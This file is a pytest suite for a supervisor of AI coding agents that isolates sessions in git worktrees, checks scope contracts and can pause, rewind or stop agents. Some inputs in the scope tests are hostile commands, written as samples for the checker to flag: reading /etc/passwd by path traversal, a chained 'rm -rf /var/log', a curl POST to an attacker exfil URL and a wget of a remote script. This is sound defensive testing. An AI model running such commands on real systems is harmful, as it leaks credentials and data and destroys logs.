"""
tests/test_session_manager.py - Comprehensive tests for Leash Session Manager, Worktree Isolation,
Scope Contracts, Lifecycle States, Snapshots/Rewind, Runaway Guard, and Daemon API.
"""
from __future__ import annotations

import asyncio
import json
import shutil
import subprocess
import time
from pathlib import Path

import pytest
from aiohttp import ClientSession

from contracts.models import (
    ActionKind,
    ActionRequest,
    ProvenanceEvent,
    ProvenanceKind,
    SessionScope,
    SessionState,
    Severity,
    Verdict,
)
from daemon.audit_logger import AuditLogger
from daemon.config import DaemonConfig
from daemon.policy_evaluator import PolicyEvaluator
from daemon.server import LeashDaemonServer
from session.manager import SessionManager
from session.runaway_guard import RunawayGuard
from session.scope import ScopeContract
from session.snapshot import SnapshotManager
from session.worktree import WorktreeManager


@pytest.fixture
def git_repo(tmp_path: Path):
    """Creates a temporary real Git repository with an initial commit."""
    repo = tmp_path / "test_repo"
    repo.mkdir()

    # git init
    subprocess.run(["git", "init"], cwd=str(repo), check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    subprocess.run(["git", "config", "user.email", "test@vibesync.dev"], cwd=str(repo), check=True)
    subprocess.run(["git", "config", "user.name", "Leash Tester"], cwd=str(repo), check=True)

    # Initial file and commit
    readme = repo / "README.md"
    readme.write_text("# Test Repo\nInitial content\n", encoding="utf-8")
    subprocess.run(["git", "add", "README.md"], cwd=str(repo), check=True)
    subprocess.run(["git", "commit", "-m", "Initial commit"], cwd=str(repo), check=True, stdout=subprocess.PIPE)

    return repo


# =============================================================================
# 1. Worktree Manager Tests
# =============================================================================

def test_worktree_creation_and_cleanup(git_repo: Path):
    mgr = WorktreeManager(git_repo)
    session_id = "s_test_wt_1"

    # Create session worktree
    wt_path = mgr.create_session_worktree(session_id)
    assert wt_path.exists()
    assert (wt_path / "README.md").exists()
    assert mgr.get_branch_name(session_id) == f"leash/{session_id}"

    # Status check
    status = mgr.get_worktree_status(session_id)
    assert status["exists"] is True
    assert status["is_clean"] is True
    assert status["branch_name"] == f"leash/{session_id}"

    # Make uncommitted change in worktree
    dirty_file = wt_path / "temp.txt"
    dirty_file.write_text("agent edit\n")
    status_dirty = mgr.get_worktree_status(session_id)
    assert status_dirty["is_clean"] is False

    # Auto-save changes
    commit_sha = mgr.save_worktree_changes(session_id, "Save agent work")
    assert commit_sha is not None
    assert mgr.get_worktree_status(session_id)["is_clean"] is True

    # Cleanup worktree
    cleaned = mgr.cleanup_session_worktree(session_id, delete_branch=False)
    assert cleaned is True
    assert not wt_path.exists()


def test_worktree_fallback_non_git(tmp_path: Path):
    non_git = tmp_path / "non_git_dir"
    non_git.mkdir()
    mgr = WorktreeManager(non_git)
    wt_path = mgr.create_session_worktree("s_fallback")
    assert wt_path.exists()
    assert mgr.cleanup_session_worktree("s_fallback") is True


# =============================================================================
# 2. Scope Contract & Drift Detection Tests
# =============================================================================

def test_scope_allowed_paths_and_traversal():
    contract = ScopeContract(
        allowed_paths=["/home/dev/repo", "/home/dev/repo/.leash/worktrees/s_01"],
        allowed_commands=["pytest", "npm", "git"],
        allowed_hosts=["localhost", "127.0.0.1"],
    )

    # In-scope action
    req_ok = ActionRequest(
        id="a_ok",
        session="s_01",
        ts=int(time.time()),
        nonce="n1",
        kind=ActionKind.SHELL,
        agent="agent-a",
        cwd="/home/dev/repo",
        command="pytest tests/",
        target_path="/home/dev/repo/tests/test_foo.py",
    )
    flags_ok = contract.validate_action(req_ok)
    assert flags_ok == []
    assert contract.is_in_scope(req_ok) is True

    # Path traversal attempt
    req_traversal = ActionRequest(
        id="a_trav",
        session="s_01",
        ts=int(time.time()),
        nonce="n2",
        kind=ActionKind.SHELL,
        agent="agent-a",
        cwd="/home/dev/repo",
        command="cat ../../../etc/passwd",
        target_path="../../secret.txt",
    )
    flags_trav = contract.validate_action(req_traversal)
    assert "path-traversal-detected" in flags_trav
    assert "outside-allowed-paths" in flags_trav

    # Sensitive watchlist file edit
    req_watchlist = ActionRequest(
        id="a_watch",
        session="s_01",
        ts=int(time.time()),
        nonce="n3",
        kind=ActionKind.FILE_EDIT,
        agent="agent-a",
        cwd="/home/dev/repo",
        target_path="/home/dev/repo/.github/workflows/deploy.yml",
    )
    flags_watch = contract.validate_action(req_watchlist)
    assert "sensitive-watchlist-hit" in flags_watch


def test_scope_allowed_commands_and_operators():
    contract = ScopeContract(
        allowed_paths=["."],
        allowed_commands=["pytest", "npm", "git"],
        allowed_hosts=["localhost"],
    )

    # Chained or piped outside-command
    req_chain = ActionRequest(
        id="a_chain",
        session="s_01",
        ts=int(time.time()),
        nonce="n4",
        kind=ActionKind.SHELL,
        agent="agent-a",
        cwd=".",
        command="pytest tests/ && rm -rf /var/log",
    )
    flags = contract.validate_action(req_chain)
    assert "outside-allowed-commands" in flags


def test_scope_allowed_hosts_and_external_drift():
    contract = ScopeContract(
        allowed_paths=["."],
        allowed_commands=["curl", "git"],
        allowed_hosts=["localhost", "127.0.0.1", "registry.npmjs.org"],
    )

    # Allowed host
    req_local = ActionRequest(
        id="a_local",
        session="s_01",
        ts=int(time.time()),
        nonce="n5",
        kind=ActionKind.SHELL,
        agent="agent-a",
        cwd=".",
        command="curl http://localhost:8080/api/health",
    )
    assert "outside-allowed-hosts" not in contract.validate_action(req_local)

    # External unauthorized host
    req_ext = ActionRequest(
        id="a_ext",
        session="s_01",
        ts=int(time.time()),
        nonce="n6",
        kind=ActionKind.SHELL,
        agent="agent-a",
        cwd=".",
        command="curl -X POST https://evil-attacker-site.com/exfil",
    )
    flags_ext = contract.validate_action(req_ext)
    assert "outside-allowed-hosts" in flags_ext


# =============================================================================
# 3. Session Manager Lifecycle & Action Binding Tests
# =============================================================================

def test_session_lifecycle_and_transitions(git_repo: Path):
    mgr = SessionManager(git_repo)

    # Create session
    session = mgr.create_session(
        agent_name="tester-bot",
        task_description="Build auth flow",
        allowed_paths=[str(git_repo)],
        allowed_commands=["pytest", "black"],
    )
    assert session.session_id.startswith("s_")
    assert session.state == SessionState.ACTIVE
    assert session.agent == "tester-bot"
    assert session.task_description == "Build auth flow"
    assert Path(session.worktree_path).exists()

    # Pause session
    assert mgr.pause_session(session.session_id) is True
    assert mgr.get_session(session.session_id).state == SessionState.PAUSED
    assert mgr.pause_session(session.session_id) is False  # Already paused

    # Resume session
    assert mgr.resume_session(session.session_id) is True
    assert mgr.get_session(session.session_id).state == SessionState.ACTIVE
    assert mgr.resume_session(session.session_id) is False  # Already active

    # Terminate session
    terminated = mgr.terminate_session(session.session_id, reason="Task complete", cleanup_worktree=True)
    assert terminated is not None
    assert terminated.state == SessionState.TERMINATED
    assert terminated.termination_reason == "Task complete"
    assert terminated.terminated_at is not None
    assert not Path(session.worktree_path).exists()


def test_action_binding_and_scope_enrichment(git_repo: Path):
    mgr = SessionManager(git_repo)
    session = mgr.create_session(
        agent_name="security-agent",
        allowed_paths=[str(git_repo)],
        allowed_commands=["pytest", "git"],
    )

    # 1. Action with missing session/agent/worktree is bound automatically
    req_unbound = ActionRequest(
        id="a_bind_1",
        session="",  # Will bind to active session
        ts=int(time.time()),
        nonce="n1",
        kind=ActionKind.SHELL,
        agent="",
        cwd=".",
        command="pytest",
    )
    bound = mgr.bind_action(req_unbound)
    assert bound.session == session.session_id
    assert bound.agent == "security-agent"
    assert bound.worktree == session.worktree_path
    assert bound.cwd == session.worktree_path
    assert "outside-allowed-commands" not in bound.scope_flags

    # 2. Action attempting command drift outside allowed_commands
    req_drift = ActionRequest(
        id="a_drift",
        session=session.session_id,
        ts=int(time.time()),
        nonce="n2",
        kind=ActionKind.SHELL,
        agent="security-agent",
        cwd=".",
        command="bash -c 'wget http://untrusted.com/script'",
    )
    bound_drift = mgr.bind_action(req_drift)
    assert "outside-allowed-commands" in bound_drift.scope_flags
    assert "outside-allowed-hosts" in bound_drift.scope_flags

    # 3. Provenance taint propagates to bound action
    provenance = ProvenanceEvent(
        id="p_01",
        session=session.session_id,
        ts=int(time.time()),
        kind=ProvenanceKind.UNTRUSTED_READ,
        source="README.md",
        line=12,
    )
    mgr.record_provenance_event(provenance)

    req_tainted = ActionRequest(
        id="a_tainted",
        session=session.session_id,
        ts=int(time.time()),
        nonce="n3",
        kind=ActionKind.SHELL,
        agent="security-agent",
        cwd=".",
        command="pytest",
    )
    bound_tainted = mgr.bind_action(req_tainted)
    assert bound_tainted.taint.tainted is True
    assert bound_tainted.taint.source == "README.md"
    assert bound_tainted.taint.line == 12

    # 4. Paused and Terminated states block actions
    mgr.pause_session(session.session_id)
    req_paused = ActionRequest(
        id="a_paused",
        session=session.session_id,
        ts=int(time.time()),
        nonce="n4",
        kind=ActionKind.SHELL,
        agent="security-agent",
        cwd=".",
        command="pytest",
    )
    bound_paused = mgr.bind_action(req_paused)
    assert "session-paused" in bound_paused.scope_flags


# =============================================================================
# 4. Snapshots & Rewind Foundation Tests
# =============================================================================

def test_snapshots_and_rewind(git_repo: Path):
    mgr = SessionManager(git_repo)
    session = mgr.create_session(agent_name="agent-rewind")
    wt_path = Path(session.worktree_path)

    # 1. Create a file and take snapshot 1
    file_a = wt_path / "feature.py"
    file_a.write_text("def v1(): return 1\n", encoding="utf-8")
    mgr.worktree_mgr.save_worktree_changes(session.session_id, "Feature v1")

    snap1 = mgr.create_pre_action_snapshot(session.session_id, "Before risky refactor")
    assert snap1 is not None
    assert snap1.git_ref.startswith(f"refs/leash/{session.session_id}/")
    assert snap1.git_ref in session.snapshots

    # 2. Perform destructive / broken edit
    file_a.write_text("BROKEN MALFORMED CODE SYNTAX ERROR\n", encoding="utf-8")
    assert "BROKEN" in file_a.read_text(encoding="utf-8")

    # 3. Rewind back to pre-action snapshot
    rewound = mgr.rewind(session.session_id, snap1.git_ref)
    assert rewound is True
    assert "def v1(): return 1" in file_a.read_text(encoding="utf-8")

    # Clean up
    mgr.terminate_session(session.session_id)


# =============================================================================
# 5. Runaway Guard Tests
# =============================================================================

def test_runaway_guard_failing_streak_and_loops():
    guard = RunawayGuard(failure_threshold=3, loop_window_seconds=10, loop_count_threshold=4, rate_limit_count=5)

    # Consecutive failing command streak
    cmd = "curl http://broken-service/api"
    assert guard.record_result(cmd, 1) is None
    assert guard.record_result(cmd, 1) is None
    # 3rd failure trips the guard
    streak_trip = guard.record_result(cmd, 1)
    assert streak_trip is not None
    assert "consecutively" in streak_trip
    assert guard.is_tripped() is True

    guard.reset()
    assert guard.is_tripped() is False

    # Command loop detection
    req = ActionRequest(
        id="a_loop",
        session="s_01",
        ts=int(time.time()),
        nonce="n1",
        kind=ActionKind.SHELL,
        agent="agent-a",
        cwd=".",
        command="ls -la",
    )
    for _ in range(3):
        assert guard.check_action(req) is None
    # 4th identical command in window trips loop guard
    loop_trip = guard.check_action(req)
    assert loop_trip is not None
    assert "loop detected" in loop_trip


# =============================================================================
# 6. Daemon Server HTTP & WebSocket Session Integration Tests
# =============================================================================

@pytest.mark.asyncio
async def test_daemon_session_endpoints_and_lifecycle(git_repo: Path):
    config = DaemonConfig(
        host="127.0.0.1",
        port=8915,
        shared_secret="session-test-secret",
        audit_log_path=git_repo / "audit.jsonl",
        dev_mode=True,
    )
    session_mgr = SessionManager(git_repo)
    audit_logger = AuditLogger(config.audit_log_path)
    server = LeashDaemonServer(config, session_mgr, audit_logger)
    await server.start()

    try:
        async with ClientSession() as client:
            # 1. POST /sessions - Create new session
            create_payload = {
                "agent": "daemon-tester-agent",
                "task_description": "Add payment gateway",
                "allowed_paths": [str(git_repo)],
                "allowed_commands": ["pytest", "npm", "git"],
                "allowed_hosts": ["localhost", "127.0.0.1"],
            }
            async with client.post("http://127.0.0.1:8915/sessions", json=create_payload) as resp:
                assert resp.status == 201
                sess_data = await resp.json()
                session_id = sess_data["session_id"]
                assert sess_data["agent"] == "daemon-tester-agent"
                assert sess_data["state"] == "active"
                assert sess_data["task_description"] == "Add payment gateway"

            # 2. GET /sessions - List sessions
            async with client.get("http://127.0.0.1:8915/sessions") as resp:
                assert resp.status == 200
                list_data = await resp.json()
                assert list_data["count"] >= 1
                assert any(s["session_id"] == session_id for s in list_data["sessions"])

            # 3. GET /sessions/{session_id} - Details
            async with client.get(f"http://127.0.0.1:8915/sessions/{session_id}") as resp:
                assert resp.status == 200
                details = await resp.json()
                assert details["session"]["session_id"] == session_id
                assert details["worktree_status"]["exists"] is True

            # 4. POST /sessions/{session_id}/pause
            async with client.post(f"http://127.0.0.1:8915/sessions/{session_id}/pause") as resp:
                assert resp.status == 200
                pause_res = await resp.json()
                assert pause_res["state"] == "paused"

            # 5. POST /action when session is paused should be DENIED
            req_payload = {
                "session": session_id,
                "command": "pytest",
                "kind": "shell",
                "agent": "daemon-tester-agent",
            }
            async with client.post("http://127.0.0.1:8915/action", json=req_payload) as resp:
                assert resp.status == 200
                action_res = await resp.json()
                assert action_res["decision"]["verdict"] == "deny"
                assert "paused" in action_res["decision"]["note"]

            # 6. POST /sessions/{session_id}/resume
            async with client.post(f"http://127.0.0.1:8915/sessions/{session_id}/resume") as resp:
                assert resp.status == 200
                resume_res = await resp.json()
                assert resume_res["state"] == "active"

            # 7. POST /sessions/{session_id}/terminate
            async with client.post(
                f"http://127.0.0.1:8915/sessions/{session_id}/terminate",
                json={"reason": "Finished testing"},
            ) as resp:
                assert resp.status == 200
                term_res = await resp.json()
                assert term_res["state"] == "terminated"

            # 8. POST /action when session is terminated should be DENIED
            async with client.post("http://127.0.0.1:8915/action", json=req_payload) as resp:
                assert resp.status == 200
                action_res = await resp.json()
                assert action_res["decision"]["verdict"] == "deny"
                assert "terminated" in action_res["decision"]["note"]

    finally:
        await server.stop()


@pytest.mark.asyncio
async def test_websocket_session_lifecycle_messages(git_repo: Path):
    config = DaemonConfig(
        host="127.0.0.1",
        port=8916,
        shared_secret="ws-session-secret",
        audit_log_path=git_repo / "audit_ws.jsonl",
        dev_mode=True,
    )
    session_mgr = SessionManager(git_repo)
    audit_logger = AuditLogger(config.audit_log_path)
    server = LeashDaemonServer(config, session_mgr, audit_logger)
    await server.start()

    try:
        async with ClientSession() as client:
            async with client.ws_connect("http://127.0.0.1:8916/ws") as ws:
                # 1. Create session via WebSocket
                create_msg = {
                    "type": "create_session",
                    "payload": {
                        "agent": "phone-guard-agent",
                        "task_description": "Refactor router",
                        "allowed_commands": ["npm", "git"],
                    },
                }
                await ws.send_str(json.dumps(create_msg))
                resp_raw = await asyncio.wait_for(ws.receive_str(), timeout=5.0)
                resp = json.loads(resp_raw)
                assert resp["type"] == "session_created"
                ws_session_id = resp["payload"]["session_id"]
                assert resp["payload"]["agent"] == "phone-guard-agent"

                # 2. Pause session via WebSocket
                await ws.send_str(json.dumps({
                    "type": "pause_session",
                    "payload": {"session_id": ws_session_id},
                }))
                pause_resp = json.loads(await asyncio.wait_for(ws.receive_str(), timeout=5.0))
                assert pause_resp["type"] == "session_paused"
                assert pause_resp["payload"]["success"] is True

                # 3. Resume session via WebSocket
                await ws.send_str(json.dumps({
                    "type": "resume_session",
                    "payload": {"session_id": ws_session_id},
                }))
                resume_resp = json.loads(await asyncio.wait_for(ws.receive_str(), timeout=5.0))
                assert resume_resp["type"] == "session_resumed"
                assert resume_resp["payload"]["success"] is True

                # 4. Get session details via WebSocket
                await ws.send_str(json.dumps({
                    "type": "get_session_details",
                    "payload": {"session_id": ws_session_id},
                }))
                details_resp = json.loads(await asyncio.wait_for(ws.receive_str(), timeout=5.0))
                assert details_resp["type"] == "session_details"
                assert details_resp["payload"]["session"]["session_id"] == ws_session_id

                # 5. Terminate session via WebSocket
                await ws.send_str(json.dumps({
                    "type": "terminate_session",
                    "payload": {"session_id": ws_session_id, "reason": "Done via phone"},
                }))
                term_resp = json.loads(await asyncio.wait_for(ws.receive_str(), timeout=5.0))
                assert term_resp["type"] == "session_terminated"
                assert term_resp["payload"]["state"] == "terminated"

    finally:
        await server.stop()
